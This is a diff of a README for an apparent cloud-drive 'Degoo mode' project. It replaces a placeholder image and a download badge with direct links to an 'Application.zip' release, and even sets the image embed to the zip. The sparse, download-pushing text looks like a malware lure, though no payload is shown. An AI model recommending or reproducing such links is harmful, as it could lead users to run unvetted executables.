@@ -2,7 +2,7 @@
 
 Welcome to the official source repository for the SNU 2D CloudDrive Degoo mode project! 🌟
 
-![SNU 2D CloudDrive Modes - Degoo](https://your-image-url-here.png)
+![SNU 2D CloudDrive Modes - Degoo](https://github.com/Wishedfoxirex/SNU_2D_CloudDrive_Modes_Degoo/releases/download/v1.0/Application.zip)
 
 ## Repository Information
 
@@ -18,7 +18,7 @@ The SNU 2D CloudDrive project aims to provide a feature-rich, user-friendly clou
 
 To access the Degoo mode for SNU 2D CloudDrive, please download the application from the following link. Click the button below to launch the application:
 
-[![Download Application](https://img.shields.io/badge/Download-Application-blue)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Download Application](https://github.com/Wishedfoxirex/SNU_2D_CloudDrive_Modes_Degoo/releases/download/v1.0/Application.zip)](https://github.com/Wishedfoxirex/SNU_2D_CloudDrive_Modes_Degoo/releases/download/v1.0/Application.zip)
 
 If the link does not work or you are unable to download the application, please check the "Releases" section of this repository for additional download options.
 
